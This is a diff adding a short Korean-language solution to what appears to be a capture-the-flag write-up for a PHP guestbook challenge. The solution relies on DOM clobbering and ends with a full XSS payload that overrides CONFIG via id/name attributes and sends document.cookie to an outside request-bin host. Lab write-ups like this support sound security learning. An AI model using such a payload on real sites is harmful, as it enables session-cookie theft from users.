@@ -58,6 +58,20 @@ php로 개발 중인 방명록 서비스입니다.
 ## Solution
 ---
 
+GuestBook에서 내가 푼 방식으로는 이 문제를 풀 수 없다.
 
+이 문제에서는 사용 가능한 속성을 지정해줬기 때문에 id, name, href만 사용 가능하다.
 
+아마 내가 푼 방식이 출제자가 의도했던 방식? 이라고 생각된다(?)
 
+<br>
+
+그래서 이 문제는 DOM Clobbering으로 풀어줘야 한다.
+
+이미 GuestBook을 풀 때 해봤으므로 바로 익스플로잇 해주면 된다.
+
+<br>
+
+```
+GuestBook.php/?content=[a](javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='main)%0d%0a[a](javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='debug)
+```
